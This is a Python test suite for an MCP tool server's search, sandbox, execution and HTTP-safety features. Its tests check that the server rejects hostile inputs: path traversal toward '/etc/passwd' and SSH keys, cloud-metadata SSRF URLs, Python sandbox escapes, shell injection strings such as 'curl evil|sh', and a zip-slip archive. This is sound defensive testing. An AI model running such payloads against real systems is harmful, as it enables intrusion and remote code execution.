#!/usr/bin/env python3
"""Offline test-suite for mts.py (MCP tool server v4.0).

Runs without network access: search engines are exercised against recorded
HTML fixtures and the HTTP layer is driven against a local loopback server.

    python3 -m unittest discover -s tests -v
    python3 tests/test_mts.py
"""
import json
import os
import socket
import sys
import tempfile
import threading
import unittest
import urllib.error
import urllib.request
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

SANDBOX = os.path.join(tempfile.gettempdir(), "mts_test_sandbox")
os.makedirs(SANDBOX, exist_ok=True)
os.environ["MCP_SANDBOX_ROOT"] = SANDBOX
os.environ["MCP_ENABLE_DANGEROUS"] = "true"
os.environ["MCP_MEMORY_FILE"] = os.path.join(SANDBOX, "memory.json")
os.environ.setdefault("MCP_LOG_LEVEL", "ERROR")

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
import mts  # noqa: E402


def call(_tool, **kwargs):
    return json.loads(mts.call_tool(_tool, kwargs))


# --------------------------------------------------------------------------
# Fixtures for the search scrapers
# --------------------------------------------------------------------------
DDG_HTML = """
<div class="result results_links results_links_deep web-result">
  <h2 class="result__title">
    <a rel="nofollow" class="result__a" href="//duckduckgo.com/l/?uddg=https%3A%2F%2Fdocs.python.org%2F3%2Flibrary%2Fasyncio.html&amp;rut=x">asyncio &mdash; Async I/O</a>
  </h2>
  <a class="result__snippet" href="#">asyncio is a library to write <b>concurrent</b> code.</a>
</div>
<div class="result results_links">
  <h2 class="result__title">
    <a href="https://realpython.com/async-io-python/" class="result__a">Async IO in Python</a>
  </h2>
  <a class="result__snippet" href="#">A complete walkthrough.</a>
</div>
"""

DDG_LITE_HTML = """
<table><tr><td>
<a rel="nofollow" href="https://example.org/one" class="result-link">First result</a>
</td></tr><tr><td class="result-snippet">Snippet number one.</td></tr>
<tr><td><a href="https://example.net/two" class="result-link">Second result</a></td></tr>
<tr><td class="result-snippet">Snippet number two.</td></tr></table>
"""

BING_HTML = """
<ol id="b_results">
<li class="b_algo"><h2><a href="https://www.python.org/" h="ID=1">Welcome to Python.org</a></h2>
<div class="b_caption"><p class="b_lineclamp2">The official home of Python.</p></div></li>
<li class="b_algo" data-x="1"><h2><a href="https://peps.python.org/pep-0008/">PEP 8 Style Guide</a></h2>
<p>Style guide for Python code.</p></li>
</ol>
"""

MOJEEK_HTML = """
<ul class="results-standard">
<li><h2><a href="https://mojeek-result.example/a" title="A">Result A</a></h2><p class="s">Snippet A text.</p></li>
<li><h2><a href="https://mojeek-result.example/b">Result B</a></h2><p class="s">Snippet B text.</p></li>
</ul>
"""


class SearchScraperTests(unittest.TestCase):
    def _patch(self, body):
        original = mts._http_get_text
        mts._http_get_text = lambda *a, **k: body
        self.addCleanup(lambda: setattr(mts, "_http_get_text", original))

    def test_duckduckgo_parses_and_unwraps_redirect(self):
        self._patch(DDG_HTML)
        results = mts._engine_duckduckgo("q", 10, 1, False, "", "us-en")
        self.assertEqual(len(results), 2)
        self.assertEqual(results[0]["url"], "https://docs.python.org/3/library/asyncio.html")
        self.assertIn("asyncio", results[0]["title"])
        self.assertIn("concurrent", results[0]["snippet"])

    def test_duckduckgo_lite_handles_href_before_class(self):
        self._patch(DDG_LITE_HTML)
        results = mts._engine_duckduckgo_lite("q", 10, 1, False, "", "us-en")
        self.assertEqual([r["url"] for r in results],
                         ["https://example.org/one", "https://example.net/two"])
        self.assertIn("Snippet number one", results[0]["snippet"])

    def test_bing_parses_results(self):
        self._patch(BING_HTML)
        results = mts._engine_bing("q", 10, 1, False, "", "us-en")
        self.assertEqual(len(results), 2)
        self.assertEqual(results[0]["url"], "https://www.python.org/")
        self.assertIn("official home", results[0]["snippet"])

    def test_mojeek_parses_results(self):
        self._patch(MOJEEK_HTML)
        results = mts._engine_mojeek("q", 10, 1, False, "", "us-en")
        self.assertEqual(len(results), 2)
        self.assertTrue(results[1]["url"].endswith("/b"))

    def test_bing_base64_redirect_unwrapping(self):
        import base64
        target = "https://target.example/page?a=1"
        encoded = base64.urlsafe_b64encode(target.encode()).decode().rstrip("=")
        wrapped = f"https://www.bing.com/ck/a?!&&p=1&u=a1{encoded}"
        self.assertEqual(mts._clean_search_url(wrapped), target)

    def test_engine_failure_is_isolated(self):
        def boom(*a, **k):
            raise RuntimeError("engine down")
        original = dict(mts.SEARCH_ENGINES)
        mts.SEARCH_ENGINES["broken"] = boom
        mts.SEARCH_ENGINES["fine"] = lambda *a, **k: [
            {"title": "t", "url": "https://ok.example/", "snippet": "s", "engine": "fine",
             "rank": 1, "domain": "ok.example"}]
        self.addCleanup(lambda: mts.SEARCH_ENGINES.clear() or mts.SEARCH_ENGINES.update(original))
        buckets, errors = mts._run_engines(["broken", "fine"], "q", 5, 1, False, "", "us-en")
        self.assertIn("broken", errors)
        self.assertEqual(len(buckets["fine"]), 1)


class RankFusionTests(unittest.TestCase):
    def test_url_normalisation_strips_tracking_and_www(self):
        a = mts._normalize_url_for_dedupe("https://www.Example.com/page/?utm_source=x&b=2#frag")
        b = mts._normalize_url_for_dedupe("http://example.com/page?b=2")
        self.assertEqual(a, b)

    def test_fusion_prefers_cross_engine_agreement(self):
        buckets = {
            "bing": [{"title": "Solo", "url": "https://solo.example/", "snippet": "x",
                      "engine": "bing", "rank": 1, "domain": "solo.example"},
                     {"title": "Shared", "url": "https://shared.example/", "snippet": "y",
                      "engine": "bing", "rank": 2, "domain": "shared.example"}],
            "duckduckgo": [{"title": "Shared", "url": "https://www.shared.example",
                            "snippet": "a much longer snippet", "engine": "duckduckgo",
                            "rank": 3, "domain": "shared.example"}],
        }
        fused = mts._fuse_results(buckets, 10)
        self.assertEqual(fused[0]["domain"], "shared.example")
        self.assertEqual(sorted(fused[0]["engines"]), ["bing", "duckduckgo"])
        self.assertEqual(len(fused), 2)
        self.assertIn("longer snippet", fused[0]["snippet"])

    def test_summarizer_returns_query_relevant_sentences(self):
        text = ("Python is a programming language. Cats are lovely animals that sleep a lot. "
                "Asyncio provides concurrency primitives for Python programs and event loops. "
                "The weather in Paris is mild during spring months of the year.")
        summary = mts._summarize_text(text, 1, query="asyncio concurrency")
        self.assertIn("Asyncio", summary)


class HttpSafetyTests(unittest.TestCase):
    def test_private_hosts_are_blocked(self):
        for host in ("127.0.0.1", "localhost", "10.0.0.5", "169.254.169.254", "::1",
                     "metadata.google.internal", "0.0.0.0", "[::ffff:127.0.0.1]"):
            self.assertTrue(mts._host_is_private(host), host)

    def test_unresolvable_host_fails_closed(self):
        self.assertTrue(mts._host_is_private("nonexistent-host.invalid"))

    def test_url_validation(self):
        with self.assertRaises(ValueError):
            mts._validated_http_url("file:///etc/passwd")
        with self.assertRaises(ValueError):
            mts._validated_http_url("https://user:pass@example.com/")
        self.assertTrue(mts._validated_http_url("https://example.com/x").startswith("https://"))

    def test_truncation_is_detected(self):
        class FakeResponse:
            def __init__(self, payload):
                self._buf = payload
                self._pos = 0

            def read(self, size=-1):
                if size is None or size < 0:
                    size = len(self._buf) - self._pos
                chunk = self._buf[self._pos:self._pos + size]
                self._pos += len(chunk)
                return chunk

        data, truncated = mts._read_stream_limited(FakeResponse(b"x" * 5000), 1024)
        self.assertEqual(len(data), 1024)
        self.assertTrue(truncated)
        with self.assertRaises(ValueError):
            mts._read_limited_response(FakeResponse(b"x" * 5000), 1024, strict=True)
        data, truncated = mts._read_stream_limited(FakeResponse(b"y" * 100), 1024)
        self.assertFalse(truncated)
        self.assertEqual(len(data), 100)

    def test_config_bool_parsing(self):
        self.assertFalse(mts._to_bool("false"))
        self.assertFalse(mts._to_bool("0"))
        self.assertFalse(mts._to_bool("no"))
        self.assertTrue(mts._to_bool("TRUE"))
        self.assertTrue(mts._to_bool(1))

    def test_ssrf_blocked_through_tools(self):
        for payload in ("http://127.0.0.1:8000/", "http://169.254.169.254/latest/meta-data/"):
            result = call("check_url_status", url=payload)
            self.assertIn("error", result, payload)


class SandboxTests(unittest.TestCase):
    def test_path_traversal_blocked(self):
        for attempt in ("../../etc/passwd", "/etc/passwd", "~/../../root/.ssh/id_rsa"):
            with self.assertRaises(ValueError):
                mts._safe_path(attempt)

    def test_relative_paths_resolve_inside_sandbox(self):
        self.assertTrue(mts._safe_path("notes.txt").startswith(os.path.realpath(SANDBOX)))

    def test_file_roundtrip(self):
        self.assertTrue(call("write_file", filepath="t/a.txt", content="hello\nworld\n")["ok"])
        self.assertIn("hello", call("read_file", filepath="t/a.txt")["content"])
        self.assertTrue(call("edit_file_replace", filepath="t/a.txt",
                             target_snippet="world", replacement_snippet="there")["ok"])
        self.assertIn("there", call("read_file", filepath="t/a.txt")["content"])
        self.assertTrue(call("file_stat", filepath="t/a.txt")["ok"])
        self.assertTrue(call("delete_file", filepath="t/a.txt")["ok"])

    def test_checksum_rejects_unknown_algorithm(self):
        call("write_file", filepath="t/b.txt", content="data")
        self.assertIn("error", call("file_checksum", filepath="t/b.txt", algorithm="not-real"))
        self.assertEqual(call("file_checksum", filepath="t/b.txt", algorithm="md5")["algorithm"], "md5")

    def test_zip_slip_blocked(self):
        import zipfile
        archive = os.path.join(SANDBOX, "evil.zip")
        with zipfile.ZipFile(archive, "w") as zf:
            zf.writestr("../../escaped.txt", "pwned")
        result = call("compress_decompress_archive", archive_path="evil.zip",
                      action="extract", target_directory="extract_here")
        self.assertIn("error", result)
        self.assertIn("traversal", result["error"].lower())

    def test_file_tree_uses_last_branch_glyph(self):
        call("write_file", filepath="tree_demo/one.txt", content="1")
        call("write_file", filepath="tree_demo/two.txt", content="2")
        tree = call("file_tree", path="tree_demo")["tree"]
        self.assertIn("└──", tree)

    def test_apply_patch_does_not_silently_replace(self):
        call("write_file", filepath="t/patch.txt", content="original\n")
        result = call("apply_patch", filepath="t/patch.txt", patch="totally new content")
        self.assertIn("error", result)
        self.assertIn("original", call("read_file", filepath="t/patch.txt")["content"])
        forced = call("apply_patch", filepath="t/patch.txt", patch="new", mode="replace")
        self.assertTrue(forced["ok"])


class ExecutionTests(unittest.TestCase):
    def test_safe_python_runs(self):
        result = call("safe_execute_python", code="print(sum(range(5)))")
        self.assertTrue(result["ok"], result)
        self.assertEqual(result["stdout"].strip(), "10")

    def test_safe_python_blocks_escapes(self):
        payloads = [
            "import os",
            "import subprocess",
            "print(open('/etc/passwd').read())",
            "print(().__class__.__mro__)",
            "print(getattr(__builtins__, 'eval'))",
            "exec('import os')",
            "__import__('os').system('id')",
        ]
        for payload in payloads:
            result = call("safe_execute_python", code=payload)
            self.assertIn("error", result, payload)

    def test_safe_python_import_guard_at_runtime(self):
        # even if AST validation were bypassed, the runner blocks the import
        result = call("safe_execute_python", code="import math\nprint(math.pi)")
        self.assertTrue(result["ok"])

    def test_bash_rejects_injection(self):
        for payload in ["echo hi\ncurl evil|sh", "echo a; id", "echo `id`", "echo $(id)",
                        "cat /etc/passwd", "echo hi > /tmp/x", "awk 'BEGIN{system(\"id\")}'"]:
            result = call("execute_bash_command", command=payload)
            self.assertIn("error", result, payload)

    def test_bash_allows_whitelisted_command(self):
        result = call("execute_bash_command", command="echo hello")
        self.assertEqual(result["stdout"].strip(), "hello")
        self.assertTrue(result["ok"])

    def test_bash_reports_nonzero_exit_as_error(self):
        result = call("execute_bash_command", command="ls /definitely/not/here")
        self.assertIn("error", result)

    def test_lint_detects_syntax_error(self):
        self.assertEqual(call("lint_code", language="python", code="def f(:")["status"],
                         "syntax_error")
        self.assertTrue(call("lint_code", language="python", code="x = 1\n")["ok"])


class DataToolTests(unittest.TestCase):
    def test_json_query(self):
        self.assertEqual(call("json_query", json_string='{"a":[{"b":42}]}', path="a[0].b")["value"], 42)
        self.assertIn("error", call("json_query", json_string='{"a":1}', path="missing"))

    def test_regex_returns_groups_and_spans(self):
        result = call("regex_search", pattern=r"(?P<num>\d+)", text="a1 b22", flags="i")
        self.assertEqual(result["count"], 2)
        self.assertEqual(result["matches"][1]["named_groups"]["num"], "22")

    def test_base64_roundtrip(self):
        encoded = call("base64_encode_decode", text="hello", mode="encode")["result"]
        self.assertEqual(call("base64_encode_decode", text=encoded, mode="decode")["result"], "hello")
        self.assertIn("error", call("base64_encode_decode", text="!!!not base64!!!", mode="decode"))

    def test_csv_json_roundtrip(self):
        rows = call("csv_to_json", csv_text="a,b\n1,2\n")["rows"]
        self.assertEqual(rows, [{"a": "1", "b": "2"}])
        csv_text = call("json_to_csv", json_string=json.dumps(rows))["csv"]
        self.assertIn("a,b", csv_text)

    def test_text_tools(self):
        stats = call("text_stats", text="One two three. Four five six!")
        self.assertEqual(stats["sentences"], 2)
        self.assertTrue(call("text_summarize", text="A sentence. " * 30)["ok"])

    def test_memory_lifecycle(self):
        self.assertTrue(call("memory_store", key="k1", value="hello world", tags="a,b")["ok"])
        self.assertEqual(call("memory_recall", key="k1")["value"], "hello world")
        self.assertEqual(call("memory_search", query="hello")["count"], 1)
        self.assertTrue(call("memory_delete", key="k1")["ok"])
        self.assertIn("error", call("memory_recall", key="k1"))

    def test_html_parsing_and_markdown(self):
        html = ("<html lang='en'><head><title>Doc</title>"
                "<meta name='description' content='Desc'></head><body>"
                "<h1>Head</h1><p>Body <a href='/rel'>link</a></p>"
                "<table><tr><th>A</th></tr><tr><td>1</td></tr></table></body></html>")
        parsed = call("parse_html_document", html=html, base_url="https://ex.com/dir/")
        self.assertEqual(parsed["title"], "Doc")
        self.assertEqual(parsed["links"][0]["url"], "https://ex.com/rel")
        tables = call("parse_html_tables", html=html)
        self.assertEqual(tables["tables"][0]["headers"], ["A"])
        markdown = mts._html_to_markdown(html, "https://ex.com/dir/")
        self.assertIn("# Head", markdown)

    def test_rss_link_text_node(self):
        feed = """<?xml version="1.0"?><rss version="2.0"><channel><title>Feed</title>
        <item><title>Post</title><link>https://example.com/post</link>
        <description>Body</description><pubDate>Mon, 01 Jan 2024 00:00:00 GMT</pubDate></item>
        </channel></rss>"""
        original = mts._fetch_url
        mts._fetch_url = lambda *a, **k: feed
        self.addCleanup(lambda: setattr(mts, "_fetch_url", original))
        result = call("rss_feed_parse", feed_url="https://example.com/feed")
        self.assertEqual(result["items"][0]["link"], "https://example.com/post")
        self.assertEqual(result["feed_title"], "Feed")


class RegistryTests(unittest.TestCase):
    def test_registry_is_consistent(self):
        import inspect
        self.assertEqual(set(mts.TOOL_MAP), set(mts.TOOL_SCHEMAS))
        self.assertEqual(set(mts.TOOL_MAP), set(mts.TOOL_CATEGORIES))
        for name, func in mts.TOOL_MAP.items():
            params = set(inspect.signature(func).parameters)
            self.assertEqual(params, set(mts.TOOL_SCHEMAS[name]), name)
            self.assertTrue((func.__doc__ or "").strip(), f"{name} needs a docstring")

    def test_all_v38_tools_still_exist(self):
        legacy = ["web_search", "fetch_webpage_text", "read_file", "write_file",
                  "edit_file_replace", "append_to_file", "list_directory", "lint_code",
                  "execute_python_code", "execute_javascript_code", "execute_bash_command",
                  "ping", "system_info", "file_checksum", "search_files", "search_file_content",
                  "delete_file", "make_directory", "copy_file", "move_file",
                  "get_environment_variable", "set_environment_variable", "http_request",
                  "json_parse_validate", "regex_search", "process_list", "git_status",
                  "web_scrape_links", "fetch_json_api", "web_download_file", "extract_metadata",
                  "dns_lookup", "check_url_status", "sitemap_parse", "rss_feed_parse",
                  "read_url_hardened", "memory_store", "memory_recall", "memory_list",
                  "safe_execute_python", "file_tree", "apply_patch", "git_diff",
                  "base64_encode_decode", "parse_url", "compress_decompress_archive",
                  "text_diff_compare", "parse_html_document", "extract_structured_data",
                  "parse_url_headers", "parse_html_tables", "extract_media_links",
                  "parse_robots_txt", "discover_feed_links"]
        missing = [name for name in legacy if name not in mts.TOOL_MAP]
        self.assertEqual(missing, [])

    def test_argument_coercion_and_validation(self):
        cleaned, problems = mts._coerce_args("web_search", {"query": "x", "max_results": "7",
                                                            "safe_search": "true"})
        self.assertEqual(cleaned["max_results"], 7)
        self.assertIs(cleaned["safe_search"], True)
        self.assertEqual(problems, [])
        _, problems = mts._coerce_args("ping", {"bogus": 1})
        self.assertTrue(problems)
        _, problems = mts._coerce_args("tool_help", {})
        self.assertTrue(any("missing required" in p for p in problems))

    def test_unknown_tool_suggests_alternatives(self):
        result = json.loads(mts.call_tool("web_serch", {"query": "x"}))
        self.assertIn("web_search", result.get("did_you_mean", []))

    def test_input_schema_generation(self):
        schema = mts._build_mcp_input_schema(mts.TOOL_SCHEMAS["web_search"])
        self.assertEqual(schema["required"], ["query"])
        self.assertEqual(schema["properties"]["max_results"]["default"], 5)
        self.assertIs(schema["properties"]["safe_search"]["default"], False)

    def test_env_secret_redaction(self):
        os.environ["MY_SECRET_TOKEN"] = "supersecret"
        self.addCleanup(lambda: os.environ.pop("MY_SECRET_TOKEN", None))
        result = call("get_environment_variable", name="MY_SECRET_TOKEN")
        self.assertEqual(result["MY_SECRET_TOKEN"], "<redacted>")
        listed = call("get_environment_variable")
        self.assertEqual(listed["variables"]["MY_SECRET_TOKEN"], "<redacted>")
        self.assertIn("error", call("set_environment_variable", name="LD_PRELOAD", value="/x.so"))

    def test_diagnostics(self):
        report = json.loads(mts.self_diagnostics(include_network=False))
        self.assertTrue(report["ok"], report.get("failed"))


class ServerTests(unittest.TestCase):
    """Drive the real Handler over loopback."""

    @classmethod
    def setUpClass(cls):
        cls.token = "test-token-123"
        mts.REQUIRE_AUTH = True
        mts.API_TOKEN = cls.token
        cls.server = ThreadingHTTPServer(("127.0.0.1", 0), mts.Handler)
        cls.port = cls.server.server_address[1]
        cls.thread = threading.Thread(target=cls.server.serve_forever, daemon=True)
        cls.thread.start()

    @classmethod
    def tearDownClass(cls):
        cls.server.shutdown()
        cls.server.server_close()
        mts.REQUIRE_AUTH = False
        mts.API_TOKEN = ""

    def _post(self, payload, token=None, path="/"):
        request = urllib.request.Request(
            f"http://127.0.0.1:{self.port}{path}",
            data=json.dumps(payload).encode(),
            headers={"Content-Type": "application/json",
                     **({"Authorization": f"Bearer {token}"} if token else {})})
        try:
            with urllib.request.urlopen(request, timeout=10) as resp:
                return resp.status, json.loads(resp.read().decode())
        except urllib.error.HTTPError as exc:
            return exc.code, json.loads(exc.read().decode() or "{}")

    def _get(self, path, token=None):
        request = urllib.request.Request(
            f"http://127.0.0.1:{self.port}{path}",
            headers={"Authorization": f"Bearer {token}"} if token else {})
        try:
            with urllib.request.urlopen(request, timeout=10) as resp:
                return resp.status, json.loads(resp.read().decode())
        except urllib.error.HTTPError as exc:
            return exc.code, json.loads(exc.read().decode() or "{}")

    def test_auth_required(self):
        status, _ = self._post({"tool": "ping"})
        self.assertEqual(status, 401)
        status, _ = self._post({"tool": "ping"}, token="wrong")
        self.assertEqual(status, 401)
        status, body = self._post({"tool": "ping"}, token=self.token)
        self.assertEqual(status, 200)
        self.assertEqual(body["status"], "pong")

    def test_health_is_public_but_tools_are_not(self):
        self.assertEqual(self._get("/health")[0], 200)
        self.assertEqual(self._get("/tools")[0], 401)
        self.assertEqual(self._get("/tools", token=self.token)[0], 200)

    def test_jsonrpc_initialize_and_tools_list(self):
        status, body = self._post({"jsonrpc": "2.0", "id": 1, "method": "initialize"},
                                  token=self.token)
        self.assertEqual(status, 200)
        self.assertEqual(body["result"]["serverInfo"]["name"], mts.SERVER_NAME)
        status, body = self._post({"jsonrpc": "2.0", "id": 2, "method": "tools/list"},
                                  token=self.token)
        tools = body["result"]["tools"]
        self.assertEqual(len(tools), len(mts.TOOL_MAP))
        self.assertTrue(all(t["description"] for t in tools))
        self.assertIn("inputSchema", tools[0])

    def test_jsonrpc_tools_call(self):
        status, body = self._post({"jsonrpc": "2.0", "id": 3, "method": "tools/call",
                                   "params": {"name": "uuid_generate",
                                              "arguments": {"count": 2}}}, token=self.token)
        self.assertEqual(status, 200)
        self.assertFalse(body["result"]["isError"])
        payload = json.loads(body["result"]["content"][0]["text"])
        self.assertEqual(len(payload["uuids"]), 2)

    def test_jsonrpc_reports_tool_errors(self):
        status, body = self._post({"jsonrpc": "2.0", "id": 4, "method": "tools/call",
                                   "params": {"name": "read_file",
                                              "arguments": {"filepath": "/etc/passwd"}}},
                                  token=self.token)
        self.assertTrue(body["result"]["isError"])

    def test_rest_path_style_call(self):
        status, body = self._post({"text": "abc"}, token=self.token, path="/hash_text")
        self.assertEqual(status, 200)
        self.assertEqual(len(body["digest"]), 64)

    def test_unknown_tool_404(self):
        status, body = self._post({"tool": "nope"}, token=self.token)
        self.assertEqual(status, 404)
        self.assertIn("available", body)

    def test_oversized_body_rejected(self):
        big = {"tool": "hash_text", "args": {"text": "x" * (mts.MCP_MAX_REQUEST_BYTES + 10)}}
        status, _ = self._post(big, token=self.token)
        self.assertEqual(status, 413)


class LocalHttpTests(unittest.TestCase):
    """Exercise the real fetch stack (redirects, limits, extraction) over loopback."""

    @classmethod
    def setUpClass(cls):
        class Fixture(BaseHTTPRequestHandler):
            def _send(self, code, body, ctype="text/html; charset=utf-8", extra=None):
                payload = body if isinstance(body, bytes) else body.encode()
                self.send_response(code)
                self.send_header("Content-Type", ctype)
                self.send_header("Content-Length", str(len(payload)))
                for key, value in (extra or {}).items():
                    self.send_header(key, value)
                self.end_headers()
                self.wfile.write(payload)

            def do_GET(self):
                if self.path == "/page":
                    self._send(200, "<html><head><title>Fixture</title>"
                                    "<meta name='description' content='A fixture page'></head>"
                                    "<body><h1>Heading</h1><p>Hello <a href='/other'>link</a></p>"
                                    "</body></html>")
                elif self.path == "/redirect":
                    self._send(302, b"", extra={"Location": "/page"})
                elif self.path == "/evil-redirect":
                    self._send(302, b"", extra={"Location": "http://169.254.169.254/latest/"})
                elif self.path == "/big":
                    self._send(200, b"x" * (3 * 1024 * 1024), "application/octet-stream")
                elif self.path == "/json":
                    self._send(200, '{"hello": "world"}', "application/json")
                elif self.path == "/status500":
                    self._send(500, "boom", "text/plain")
                else:
                    self._send(404, "nope", "text/plain")

            def log_message(self, *args):
                pass

        cls.server = ThreadingHTTPServer(("127.0.0.1", 0), Fixture)
        cls.port = cls.server.server_address[1]
        cls.base = f"http://127.0.0.1:{cls.port}"
        cls.thread = threading.Thread(target=cls.server.serve_forever, daemon=True)
        cls.thread.start()
        cls._saved = mts.ALLOW_PRIVATE_NETWORKS
        mts.ALLOW_PRIVATE_NETWORKS = True  # loopback fixture

    @classmethod
    def tearDownClass(cls):
        mts.ALLOW_PRIVATE_NETWORKS = cls._saved
        cls.server.shutdown()
        cls.server.server_close()

    def test_fetch_and_extract(self):
        result = call("fetch_webpage_text", url=f"{self.base}/page")
        self.assertTrue(result["ok"])
        self.assertEqual(result["title"], "Fixture")
        self.assertIn("Hello", result["text"])

    def test_redirects_are_followed(self):
        result = call("check_url_status", url=f"{self.base}/redirect")
        self.assertEqual(result["status_code"], 200)
        self.assertTrue(result["redirected"])

    def test_redirect_to_metadata_host_is_blocked(self):
        result = call("read_url_hardened", url=f"{self.base}/evil-redirect")
        self.assertIn("error", result)
        self.assertIn("blocked", result["error"].lower())

    def test_download_size_limit_is_enforced_loudly(self):
        result = call("web_download_file", url=f"{self.base}/big",
                      destination_filepath="downloads/big.bin", max_bytes=65536)
        self.assertIn("error", result)
        self.assertFalse(os.path.exists(os.path.join(SANDBOX, "downloads", "big.bin")))
        ok_result = call("web_download_file", url=f"{self.base}/json",
                         destination_filepath="downloads/small.json")
        self.assertTrue(ok_result["ok"])
        self.assertEqual(ok_result["size_bytes"], 18)

    def test_http_status_errors_are_reported(self):
        result = call("http_request", url=f"{self.base}/status500")
        self.assertEqual(result["status_code"], 500)
        self.assertFalse(result["ok"])
        self.assertEqual(call("check_url_status", url=f"{self.base}/status500")["status_code"], 500)

    def test_json_api_and_markdown_and_parallel_fetch(self):
        self.assertEqual(call("fetch_json_api", url=f"{self.base}/json")["data"]["hello"], "world")
        markdown = call("url_to_markdown", url=f"{self.base}/page")["markdown"]
        self.assertIn("# Heading", markdown)
        many = call("fetch_many_urls", urls=f"{self.base}/page, {self.base}/json")
        self.assertEqual(many["succeeded"], 2)

    def test_search_pipeline_end_to_end(self):
        """web_search over a stubbed engine: fusion, caching and content fetching."""
        base = self.base
        mts.SEARCH_ENGINES["fixture"] = lambda q, c, p, s, t, r: [
            {"title": "Fixture page", "url": f"{base}/page", "snippet": "hello",
             "engine": "fixture", "rank": 1, "domain": "127.0.0.1"}]
        self.addCleanup(lambda: mts.SEARCH_ENGINES.pop("fixture", None))
        mts._cache_clear()
        result = call("web_search", query="fixture", engines="fixture", fetch_content=True,
                      content_chars=500)
        self.assertTrue(result["ok"])
        self.assertEqual(result["results"][0]["url"], f"{base}/page")
        self.assertIn("Hello", result["pages"][0]["content"])
        cached = call("web_search", query="fixture", engines="fixture")
        self.assertTrue(cached["cached"])
        self.assertTrue(call("cache_stats")["entries"] >= 1)
        self.assertTrue(call("cache_clear")["ok"])


if __name__ == "__main__":
    unittest.main(verbosity=2)
